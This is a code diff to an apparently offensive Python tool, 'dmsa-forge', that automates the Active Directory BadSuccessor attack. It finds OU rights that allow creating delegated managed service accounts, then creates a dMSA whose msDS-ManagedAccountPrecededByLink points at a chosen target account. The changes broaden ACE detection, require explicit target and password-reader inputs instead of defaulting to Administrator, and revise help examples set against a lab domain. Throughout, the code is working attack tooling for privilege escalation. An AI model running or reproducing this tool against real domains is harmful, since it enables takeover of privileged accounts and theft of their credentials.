@@ -52,7 +52,8 @@ PROJECT_URL = 'https://github.com/RedteamNotes/dmsa-forge'
 DEFAULT_UPDATE_SOURCE = 'git+https://github.com/RedteamNotes/dmsa-forge.git'
 DEFAULT_UPDATE_VERSION_URL = 'https://api.github.com/repos/RedteamNotes/dmsa-forge/releases/latest'
 DEFAULT_SUGGESTED_DMSA_NAME = 'redpen'
-DEFAULT_SUGGESTED_TARGET_ACCOUNT = 'Administrator'
+TARGET_ACCOUNT_PLACEHOLDER = 'ACCOUNT_TO_SUCCEED'
+PRINCIPALS_ALLOWED_PLACEHOLDER = 'SID_OR_NAME'
 BADSUCCESSOR_RIGHTS_LABEL = 'BadSuccessor-relevant OU rights'
 BADSUCCESSOR_RIGHTS_MEANING = 'create dMSA objects or control listed OUs'
 NEXT_STEP_PREFIX_ENV = 'DMSA_FORGE_NEXT_STEP_PREFIX'
@@ -1056,6 +1057,7 @@ class DMSAForge:
                 "00000000-0000-0000-0000-000000000000": "All Objects",
                 "0feb936f-47b3-49f2-9386-1dedc2c23765": "msDS-DelegatedManagedServiceAccount",
             }
+            allowed_ace_types = self._access_allowed_ace_types()
 
             def record_allowed_sid(sid, ou_dn):
                 identity = self.resolve_sid_to_name(ldap_connection, sid) if self._search_resolve_names else sid
@@ -1081,24 +1083,24 @@ class DMSAForge:
                     dacl = sd['Dacl']
                     if dacl and hasattr(dacl, 'aces') and dacl.aces:
                         for ace in dacl.aces:
-                            # Only process ALLOW ACEs
-                            if ace['AceType'] != ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE:
+                            # Process ordinary allow ACEs and AD object-specific allow ACEs.
+                            if self._ace_type_value(ace) not in allowed_ace_types:
                                 continue
 
                             # Check if ACE has relevant rights
-                            mask = int(ace['Ace']['Mask']['Mask'])
+                            ace_data = ace['Ace']
+                            mask = int(ace_data['Mask']['Mask'])
                             has_relevant_right = any(mask & right_value for right_value in relevant_rights.values())
                             if not has_relevant_right:
                                 continue
 
                             # Check object type (must match relevant object types)
-                            object_type = getattr(ace['Ace'], 'ObjectType', None)
-                            if object_type:
-                                object_guid = str(object_type).lower()
+                            object_guid = self._ace_object_type_guid(ace_data)
+                            if object_guid:
                                 if object_guid not in relevant_object_types:
                                     continue
 
-                            sid = ace['Ace']['Sid'].formatCanonical()
+                            sid = ace_data['Sid'].formatCanonical()
 
                             if self.is_excluded_sid(sid, domain_sid):
                                 continue
@@ -1122,6 +1124,7 @@ class DMSAForge:
                 'object_sid': None,
                 'effective_sids': [],
                 'token_groups_read': False,
+                'sam_account_name': getattr(self, '_username', None),
             }
             if allowed_identities:
                 try:
@@ -1133,36 +1136,42 @@ class DMSAForge:
                         'object_sid': None,
                         'effective_sids': [],
                         'token_groups_read': False,
+                        'sam_account_name': getattr(self, '_username', None),
                     }
 
                 logging.info('Found %d identities with %s.' % (len(allowed_identities), BADSUCCESSOR_RIGHTS_LABEL))
                 logging.info('Rights evaluated: %s.' % BADSUCCESSOR_RIGHTS_MEANING)
                 if current_user.get('status') == 'ok':
-                    matched_count = len([
+                    matched_sids = [
                         sid for sid in allowed_identities
                         if self._bound_user_match_status(sid, current_user) == 'yes'
-                    ])
+                    ]
+                    matched_count = len(matched_sids)
+                    bound_account = current_user.get('sam_account_name') or getattr(self, '_username', None) or '(unknown)'
+                    logging.info('Bound account: %s' % bound_account)
                     if matched_count:
-                        logging.info('Bound user effective SID check: matched %d listed identity.' % matched_count)
+                        logging.info('Bound account has BadSuccessor-relevant rights on the listed OUs.')
+                        for sid in matched_sids:
+                            logging.info('Matched effective SID: %s - %s' % (sid, self._effective_sid_source_label(sid, current_user)))
                     elif current_user.get('group_sids_resolved') or current_user.get('token_groups_read'):
-                        logging.info('Bound user effective SID check: no match.')
+                        logging.info('Bound account does not match the listed OU rights.')
                     else:
-                        logging.info('Bound user effective SID check: unknown; group SID lookup did not return results.')
+                        logging.info('Bound account rights could not be confirmed; group SID lookup did not return results.')
                 else:
-                    logging.info('Bound user effective SID check: unknown. %s' % current_user.get('reason', ''))
+                    logging.info('Bound account rights could not be confirmed. %s' % current_user.get('reason', ''))
                 logging.info("")
-                logging.info("%-50s %-18s %s" % ("Identity", "Bound user", "OUs with relevant rights"))
+                logging.info("%-50s %-18s %s" % ("Identity", "Bound account", "OUs with relevant rights"))
                 logging.info("%-50s %-18s %s" % ("-" * 50, "-" * 18, "-" * 30))
 
                 for sid, item in allowed_identities.items():
                     identity = item['identity']
                     ous = item['ous']
                     ou_list = "{%s}" % ", ".join([self._display_dn(ou) for ou in ous])
-                    logging.info("%-50s %-18s %s" % (identity[:50], self._bound_user_match_status(sid, current_user), ou_list))
+                    logging.info("%-50s %-18s %s" % (identity[:50], self._bound_user_match_display(sid, current_user), ou_list))
             else:
                 logging.info('No identities found with %s.' % BADSUCCESSOR_RIGHTS_LABEL)
                 logging.info("")
-                logging.info("%-50s %-18s %s" % ("Identity", "Bound user", "OUs with relevant rights"))
+                logging.info("%-50s %-18s %s" % ("Identity", "Bound account", "OUs with relevant rights"))
                 logging.info("%-50s %-18s %s" % ("-" * 50, "-" * 18, "-" * 30))
                 logging.info("%-50s %-18s %s" % ("(none)", "(none)", "(none)"))
             self._set_report_result(
@@ -1175,7 +1184,12 @@ class DMSAForge:
                 rights_label=BADSUCCESSOR_RIGHTS_LABEL,
                 rights_meaning=BADSUCCESSOR_RIGHTS_MEANING,
                 bound_user=current_user,
+                bound_account=current_user,
                 bound_user_match_count=len([
+                    sid for sid in allowed_identities
+                    if self._bound_user_match_status(sid, current_user) == 'yes'
+                ]),
+                bound_account_match_count=len([
                     sid for sid in allowed_identities
                     if self._bound_user_match_status(sid, current_user) == 'yes'
                 ]),
@@ -1184,6 +1198,8 @@ class DMSAForge:
                         'sid': sid,
                         'identity': item['identity'],
                         'applies_to_bound_user': self._bound_user_match_status(sid, current_user),
+                        'bound_account_match': self._bound_user_match_status(sid, current_user),
+                        'bound_account_match_source': self._effective_sid_source_label(sid, current_user),
                         'ous': [self._display_dn(ou) for ou in item['ous']],
                     }
                     for sid, item in allowed_identities.items()
@@ -1196,6 +1212,7 @@ class DMSAForge:
                     'target_ou': ou,
                 }
                 for sid, item in allowed_identities.items()
+                if self._bound_user_match_status(sid, current_user) == 'yes'
                 for ou in item['ous']
             ]
             return True
@@ -1393,9 +1410,18 @@ class DMSAForge:
 
         primary_group_sid = self._primary_group_sid(object_sid, self._entry_value(entry, 'primaryGroupID'))
         effective_sids = []
+        effective_sid_sources = {}
         for sid in object_sids + token_group_sids + recursive_group_sids + ([primary_group_sid] if primary_group_sid else []):
             if sid and sid not in effective_sids:
                 effective_sids.append(sid)
+            if sid and sid in object_sids:
+                effective_sid_sources.setdefault(sid, 'direct account SID')
+            elif sid and sid in token_group_sids:
+                effective_sid_sources.setdefault(sid, 'group SID from tokenGroups')
+            elif sid and sid in recursive_group_sids:
+                effective_sid_sources.setdefault(sid, 'group SID from recursive membership')
+            elif sid and sid == primary_group_sid:
+                effective_sid_sources.setdefault(sid, 'primary group SID')
 
         if token_groups_read:
             group_sid_source = 'tokenGroups'
@@ -1413,6 +1439,7 @@ class DMSAForge:
             'sam_account_name': self._entry_value(entry, 'sAMAccountName') or self._username,
             'object_sid': object_sid,
             'effective_sids': effective_sids,
+            'effective_sid_sources': effective_sid_sources,
             'effective_sid_count': len(effective_sids),
             'token_groups_read': token_groups_read,
             'group_sids_resolved': token_groups_read or recursive_groups_read,
@@ -1428,6 +1455,17 @@ class DMSAForge:
         if current_user.get('group_sids_resolved') or current_user.get('token_groups_read'):
             return 'no'
         return 'unknown'
+
+    def _effective_sid_source_label(self, sid, current_user):
+        if not sid or not current_user or current_user.get('status') != 'ok':
+            return 'unknown'
+        return (current_user.get('effective_sid_sources') or {}).get(sid, 'unknown')
+
+    def _bound_user_match_display(self, sid, current_user):
+        status = self._bound_user_match_status(sid, current_user)
+        if status == 'yes':
+            return 'yes, %s' % self._effective_sid_source_label(sid, current_user)
+        return status
 
     def _lookup_token_group_sids(self, ldap_connection, account_dn):
         try:
@@ -1965,6 +2003,54 @@ class DMSAForge:
         normalized_candidates = [self._normalize_sid(sid) for sid in candidate_sids if sid]
         return expected_sid in normalized_candidates
 
+    def _access_allowed_ace_types(self):
+        ace_types = set()
+        for class_name in ('ACCESS_ALLOWED_ACE', 'ACCESS_ALLOWED_OBJECT_ACE'):
+            ace_class = getattr(ldaptypes, class_name, None)
+            ace_type = getattr(ace_class, 'ACE_TYPE', None)
+            if ace_type is not None:
+                try:
+                    ace_types.add(int(ace_type))
+                except (TypeError, ValueError):
+                    ace_types.add(ace_type)
+        return ace_types
+
+    def _ace_type_value(self, ace):
+        try:
+            value = ace['AceType']
+            try:
+                return int(value)
+            except (TypeError, ValueError):
+                return value
+        except Exception:
+            return None
+
+    def _guid_to_string(self, value):
+        if value in (None, b'', ''):
+            return ''
+        if isinstance(value, uuid.UUID):
+            return str(value).lower()
+        if isinstance(value, bytes):
+            if len(value) == 16:
+                try:
+                    return str(uuid.UUID(bytes_le=value)).lower()
+                except Exception:
+                    pass
+            try:
+                value = value.decode('utf-8')
+            except UnicodeDecodeError:
+                return ''
+        text = str(value).strip().strip('{}').lower()
+        if re.match(r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$', text):
+            return text
+        return ''
+
+    def _ace_object_type_guid(self, ace_data):
+        try:
+            return self._guid_to_string(ace_data['ObjectType'])
+        except Exception:
+            return ''
+
     def _security_descriptor_summary_lines(self, sd_data):
         sd, raw, error = self._parse_security_descriptor(sd_data)
         if error:
@@ -2112,7 +2198,19 @@ class DMSAForge:
                 self._set_report_failure('dmsa_already_exists', message, dmsa_dn=self._display_dn(dmsa_dn))
                 return False
 
-            principals_allowed = self._principals_allowed if self._principals_allowed else self._username
+            if not self._target_account:
+                message = 'Target account is required for dMSA creation. Use --target-account with the account to be linked by msDS-ManagedAccountPrecededByLink.'
+                logging.error(message)
+                self._set_report_failure('missing_target_account', message)
+                return False
+
+            if not self._principals_allowed:
+                message = 'Principals allowed is required for dMSA creation. Use --principals-allowed with the SID, DN, or name that should retrieve the managed password.'
+                logging.error(message)
+                self._set_report_failure('missing_principals_allowed', message)
+                return False
+
+            principals_allowed = self._principals_allowed
             target_account = self._target_account
 
             dns_hostname = self._effective_dns_hostname()
@@ -2562,20 +2660,19 @@ Example:
     'add': '''add - create and verify a dMSA object
 
 Usage:
-  dmsa-forge add [domain/]username[:password] --target-ou OU_DN [options]
+  dmsa-forge add [domain/]username[:password] --target-ou OU_DN --target-account ACCOUNT --principals-allowed SID_OR_NAME [options]
 
 Required:
   --target-ou OU_DN
+  --target-account ACCOUNT_OR_DN
+  --principals-allowed USER_OR_SID
 
 Strongly recommended:
   --dry-run first
   --dmsa-name NAME for reproducible cleanup
 
-Default:
-  --target-account Administrator
-
 Example:
-  dmsa-forge add eighteen.htb/adam.scott:'PASSWORD' --dc-host dc01.eighteen.htb --target-ou 'OU=Staff,DC=eighteen,DC=htb' --dmsa-name redpen
+  dmsa-forge add eighteen.htb/adam.scott:'PASSWORD' --dc-host dc01.eighteen.htb --target-ou 'OU=Staff,DC=eighteen,DC=htb' --dmsa-name redpen --target-account ACCOUNT_TO_SUCCEED --principals-allowed '<SID_OR_NAME>'
 ''',
     'verify': '''verify - read and validate an existing dMSA object
 
@@ -2742,7 +2839,7 @@ Usage:
   dmsa-forge plan ACTION [domain/]username[:password] [options]
 
 Examples:
-  dmsa-forge plan add eighteen.htb/user --target-account Administrator
+  dmsa-forge plan add eighteen.htb/user --target-ou OU=Staff,DC=eighteen,DC=htb --target-account ACCOUNT_TO_SUCCEED --principals-allowed SID_OR_NAME
   dmsa-forge plan delete eighteen.htb/user --dmsa-name redpen --target-ou OU=Staff,DC=eighteen,DC=htb
 
 Behavior:
@@ -3484,11 +3581,11 @@ def planned_inference_events(options):
     if dns_hostname and not getattr(options, 'dns_hostname_supplied', False):
         add('dns_hostname', 'inferred', 'from --dmsa-name and account/scope domain')
 
-    if options.action == 'add' and not getattr(options, 'target_account_supplied', False):
-        add('target_account', 'inferred', 'default %s' % DEFAULT_SUGGESTED_TARGET_ACCOUNT)
+    if options.action == 'add' and not options.target_account:
+        add('target_account', 'required', 'set the account linked by msDS-ManagedAccountPrecededByLink')
 
     if options.principals_allowed is None and options.action == 'add':
-        add('principals_allowed', 'runtime_default', 'use the authenticated username')
+        add('principals_allowed', 'required', 'set the SID, DN, or name written into msDS-GroupMSAMembership')
 
     return events
 
@@ -3497,7 +3594,7 @@ def planned_ldap_operations(options):
     base_dn = current_base_dn(options) or '(derived at runtime)'
     dmsa_dn = planned_dmsa_dn(options)
     target_account = options.target_account
-    principals_allowed = options.principals_allowed or '(current user at runtime)'
+    principals_allowed = options.principals_allowed
     verify_attempts = getattr(options, 'verify_attempts', DEFAULT_VERIFY_ATTEMPTS)
 
     operations = []
@@ -3541,7 +3638,14 @@ def planned_ldap_operations(options):
         })
 
     if options.action == 'add':
-        operations.append(planned_principals_allowed_step(principals_allowed, base_dn))
+        if principals_allowed:
+            operations.append(planned_principals_allowed_step(principals_allowed, base_dn))
+        else:
+            operations.append({
+                'type': 'input_required',
+                'field': '--principals-allowed',
+                'purpose': 'msDS-GroupMSAMembership reader SID',
+            })
         if target_account and looks_like_dn(target_account):
             operations.append({
                 'type': 'search',
@@ -3551,13 +3655,19 @@ def planned_ldap_operations(options):
                 'attributes': ['distinguishedName', 'objectClass'],
                 'purpose': 'target account DN validation',
             })
-        else:
+        elif target_account:
             operations.append({
                 'type': 'search',
                 'base': base_dn,
                 'scope': LDAP_SUBTREE,
                 'filter': 'target account lookup',
                 'attributes': ['distinguishedName', 'objectClass', 'sAMAccountName'],
+            })
+        else:
+            operations.append({
+                'type': 'input_required',
+                'field': '--target-account',
+                'purpose': 'msDS-ManagedAccountPrecededByLink target DN',
             })
         operations.append({
             'type': 'add',
@@ -3663,8 +3773,8 @@ def build_operation_report(options, mode, success=None, result=None):
             'target_ou': report_ready_value(options.target_ou, options) if options.target_ou else '(not set)',
             'dmsa_name': options.dmsa_name or '(generated at runtime)',
             'planned_dmsa_dn': report_ready_value(dmsa_dn, options) if dmsa_dn else '(not available)',
-            'target_account': report_ready_value(options.target_account, options) if options.target_account else '(not set)',
-            'principals_allowed': report_ready_value(options.principals_allowed, options) if options.principals_allowed else '(current user at runtime)',
+            'target_account': report_ready_value(options.target_account, options) if options.target_account else '(required for add execution)',
+            'principals_allowed': report_ready_value(options.principals_allowed, options) if options.principals_allowed else '(required for add execution)',
             'dns_hostname': dns_hostname or '(generated at runtime)',
             'hashes_provided': bool(options.hashes),
             'aes_key_provided': bool(options.aes_key),
@@ -3804,15 +3914,17 @@ def append_workflow_options(
     yes=None,
     dmsa_name=None,
     target_account=None,
+    principals_allowed=None,
 ):
     effective_dmsa_name = options.dmsa_name if dmsa_name is None else dmsa_name
     effective_target_account = options.target_account if target_account is None else target_account
+    effective_principals_allowed = options.principals_allowed if principals_allowed is None else principals_allowed
     if action in ('add', 'verify', 'delete'):
         append_option(parts, '--target-ou', options.target_ou)
         append_option(parts, '--dmsa-name', effective_dmsa_name)
     if action == 'add':
         append_option(parts, '--target-account', effective_target_account)
-        append_option(parts, '--principals-allowed', options.principals_allowed)
+        append_option(parts, '--principals-allowed', effective_principals_allowed)
         append_option(parts, '--dns-hostname', options.dns_hostname)
         if options.verify_attempts != DEFAULT_VERIFY_ATTEMPTS:
             append_option(parts, '--verify-attempts', options.verify_attempts)
@@ -3821,7 +3933,7 @@ def append_workflow_options(
         if options.kdc_wait:
             append_option(parts, '--kdc-wait', options.kdc_wait)
     elif action == 'verify':
-        append_option(parts, '--principals-allowed', options.principals_allowed)
+        append_option(parts, '--principals-allowed', effective_principals_allowed)
     elif action == 'delete':
         append_option(parts, '--yes', True if yes is True or options.yes else None)
     elif action == 'search':
@@ -3835,6 +3947,13 @@ def append_workflow_options(
     guidance = options.kerberos_guidance if kerberos_guidance is None else kerberos_guidance
     if action in ('add', 'verify') and guidance:
         append_option(parts, '--kerberos-guidance', True)
+
+
+def options_with_overrides(options, **overrides):
+    copied = argparse.Namespace(**vars(options))
+    for key, value in overrides.items():
+        setattr(copied, key, value)
+    return copied
 
 
 def command_for_action(action, options, plan=False, **overrides):
@@ -3855,7 +3974,7 @@ def command_for_search_add_plan(options, candidate):
         return None
 
     dmsa_name = options.dmsa_name or DEFAULT_SUGGESTED_DMSA_NAME
-    target_account = options.target_account or DEFAULT_SUGGESTED_TARGET_ACCOUNT
+    target_account = options.target_account or TARGET_ACCOUNT_PLACEHOLDER
     parts = [TOOL_NAME, 'plan', 'add', options.account]
     append_connection_options(parts, options)
     append_auth_options(parts, options)
@@ -3908,15 +4027,26 @@ def suggested_dmsa_name_from_target_account(options):
 
 def command_for_dry_run_action(options):
     suggested_dmsa_name = suggested_dmsa_name_from_target_account(options)
+    target_account = options.target_account or TARGET_ACCOUNT_PLACEHOLDER
+    principals_allowed = options.principals_allowed or PRINCIPALS_ALLOWED_PLACEHOLDER
     if suggested_dmsa_name:
         command = command_for_action(
             options.action,
             options,
             yes=True,
             dmsa_name=suggested_dmsa_name,
-            target_account=DEFAULT_SUGGESTED_TARGET_ACCOUNT,
+            target_account=TARGET_ACCOUNT_PLACEHOLDER,
+            principals_allowed=principals_allowed,
         )
         return command, ''
+    if options.action == 'add':
+        return command_for_action(
+            options.action,
+            options,
+            yes=True,
+            target_account=target_account,
+            principals_allowed=principals_allowed,
+        ), ''
     return command_for_action(options.action, options, yes=True), ''
 
 
@@ -3961,7 +4091,19 @@ def search_next_step_candidates(result):
     ]
 
 
-def build_next_steps(options, mode, success, result=None):
+def report_has_rejected_dc_ip(report):
+    for event in (report or {}).get('inference') or []:
+        if event.get('kind') == 'dc_ip' and event.get('status') == 'rejected':
+            return True
+    return False
+
+
+def command_for_dc_ip_fix(options):
+    fixed_options = options_with_overrides(options, dc_ip='REAL_DC_IPV4')
+    return command_for_action(options.action, fixed_options)
+
+
+def build_next_steps(options, mode, success, result=None, report=None):
     steps = []
 
     def add(label, command, hint=''):
@@ -3977,6 +4119,10 @@ def build_next_steps(options, mode, success, result=None):
         return steps
 
     if not success:
+        return steps
+
+    if report_has_rejected_dc_ip(report) and not options.dc_ip and options.action in ACTION_CHOICES:
+        add('Rerun with a real DC IPv4', command_for_dc_ip_fix(options))
         return steps
 
     if options.action == 'add':
@@ -4010,7 +4156,7 @@ def attach_next_steps(report, options, mode, success):
     if report is None:
         return report
     result = dict(report.get('result') or {})
-    result['next_steps'] = build_next_steps(options, mode=mode, success=success, result=result)
+    result['next_steps'] = build_next_steps(options, mode=mode, success=success, result=result, report=report)
     result.pop('_next_step_candidates', None)
     report['result'] = result
     return report
@@ -4063,15 +4209,17 @@ def planned_bad_successor_values(options, report):
     dmsa_sam = '%s$' % options.dmsa_name if options.dmsa_name else '(generated at runtime)'
     dmsa_dn = planned_dmsa_dn(options) or '(generated at runtime; needs --dmsa-name and --target-ou)'
     dns_hostname = effective_dns_hostname(options) or '(generated at runtime; needs --dmsa-name and domain)'
-    principals_allowed = options.principals_allowed or '(authenticated user at runtime)'
-    if validate_sid_syntax(principals_allowed):
+    principals_allowed = options.principals_allowed
+    if not principals_allowed:
+        membership = '(required for execution)'
+    elif validate_sid_syntax(principals_allowed):
         membership = 'allow %s' % principals_allowed
     else:
         membership = 'allow SID resolved from %s' % principals_allowed
-    target_account = options.target_account or '(required)'
+    target_account = options.target_account or '(required for execution)'
     if looks_like_dn(target_account):
         preceded_by = target_account
-    elif target_account == '(required)':
+    elif target_account == '(required for execution)':
         preceded_by = target_account
     else:
         preceded_by = 'DN resolved from %s' % target_account
@@ -4248,8 +4396,8 @@ def build_parser():
     workflow.add_argument('--action', '-action', choices=ACTION_CHOICES, default='search', help='Action to perform. Prefer task-named commands such as "dmsa-forge add ...".')
     workflow.add_argument('--dmsa-name', '-dmsa-name', dest='dmsa_name', action='store', metavar='NAME', help='dMSA name. Add auto-generates dMSA-[A-Z0-9]{8} if omitted; verify/delete require it.')
     workflow.add_argument('--target-ou', '-target-ou', dest='target_ou', action='store', metavar='OU_DN', help='Target OU DN, for example "OU=Staff,DC=domain,DC=local".')
-    workflow.add_argument('--target-account', '-target-account', dest='target_account', action='store', metavar='ACCOUNT_OR_DN', help='Target user/computer sAMAccountName or DN for msDS-ManagedAccountPrecededByLink. Defaults to Administrator for add.')
-    workflow.add_argument('--principals-allowed', '-principals-allowed', dest='principals_allowed', action='store', metavar='USER_OR_SID', help='User/computer/group name, DN, or SID allowed to retrieve the managed password. Defaults to current username.')
+    workflow.add_argument('--target-account', '-target-account', dest='target_account', action='store', metavar='ACCOUNT_OR_DN', help='Target user/computer sAMAccountName or DN for msDS-ManagedAccountPrecededByLink. Required for add execution.')
+    workflow.add_argument('--principals-allowed', '-principals-allowed', dest='principals_allowed', action='store', metavar='USER_OR_SID', help='User/computer/group name, DN, or SID allowed to retrieve the managed password. Required for add execution.')
     workflow.add_argument('--dns-hostname', '-dns-hostname', dest='dns_hostname', action='store', metavar='HOSTNAME', help='DNS hostname for the dMSA. Defaults to dmsaname.domain.')
     workflow.add_argument('--profile', choices=PROFILE_CHOICES, help='Apply a local preset: safe=redacted dry-run, report=JSON report, ci=quiet JSON/no banner.')
 
@@ -4361,7 +4509,7 @@ def add_dmsa_workflow_options(parser, action):
         workflow.add_argument('--dmsa-name', '-dmsa-name', dest='dmsa_name', action='store', metavar='NAME', help='dMSA name.')
         workflow.add_argument('--target-ou', '-target-ou', dest='target_ou', action='store', metavar='OU_DN', help='Target OU DN.')
     if action == 'add':
-        workflow.add_argument('--target-account', '-target-account', dest='target_account', action='store', metavar='ACCOUNT_OR_DN', help='Target user/computer sAMAccountName or DN. Defaults to Administrator.')
+        workflow.add_argument('--target-account', '-target-account', dest='target_account', action='store', metavar='ACCOUNT_OR_DN', help='Target user/computer sAMAccountName or DN. Required for execution.')
     if action in ('add', 'verify'):
         workflow.add_argument('--principals-allowed', '-principals-allowed', dest='principals_allowed', action='store', metavar='USER_OR_SID', help='Expected managed-password reader.')
     if action == 'add':
@@ -4491,9 +4639,6 @@ def prepare_cli_options(parser, options):
         if normalized:
             options.dmsa_name = normalized
 
-    if options.action == 'add' and not options.target_account:
-        options.target_account = DEFAULT_SUGGESTED_TARGET_ACCOUNT
-
     account_domain = domain_from_account_hint(options.account)
     if account_domain and validate_domain_name(account_domain):
         account_domain = account_domain.lower()
@@ -4592,6 +4737,18 @@ def validate_cli_options(parser, options):
 
     if options.action in DESTRUCTIVE_ACTIONS and not options.yes and not options.dry_run:
         parser.error('Action "%s" requires --yes. Use --dry-run to preview without confirmation.' % options.action)
+
+    if options.action == 'add' and not options.dry_run:
+        missing_add_inputs = []
+        if not options.target_account:
+            missing_add_inputs.append('--target-account')
+        if not options.principals_allowed:
+            missing_add_inputs.append('--principals-allowed')
+        if missing_add_inputs:
+            parser.error(
+                'Action "add" execution requires: %s. Use "dmsa-forge plan add ..." to preview values before writing LDAP.'
+                % ', '.join(missing_add_inputs)
+            )
 
     if options.search_summary and options.include_sd:
         parser.error('--summary cannot be combined with --include-security-descriptor')
